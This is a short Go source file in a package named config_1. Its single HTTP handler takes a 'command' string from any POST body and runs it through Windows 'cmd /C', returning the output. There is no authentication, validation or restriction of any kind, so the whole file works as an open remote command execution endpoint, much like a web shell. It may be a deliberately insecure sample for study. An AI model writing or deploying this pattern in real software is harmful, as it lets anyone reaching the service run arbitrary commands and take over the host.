package config_1

import (
	"encoding/json"
	"net/http"
	"os/exec"
)

type CmdRequest struct {
	Command string `json:"command"`
}

func HandleCommandExec(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Only POST allowed", http.StatusMethodNotAllowed)
		return
	}

	var req CmdRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Invalid input", http.StatusBadRequest)
		return
	}

	// Use 'cmd /C' for Windows command execution
	out, err := exec.Command("cmd", "/C", req.Command).CombinedOutput()

	response := map[string]string{
		"output": string(out),
	}
	w.Header().Set("Content-Type", "application/json")

	if err != nil {
		w.WriteHeader(http.StatusInternalServerError)
	} else {
		w.WriteHeader(http.StatusOK)
	}

	json.NewEncoder(w).Encode(response)
}
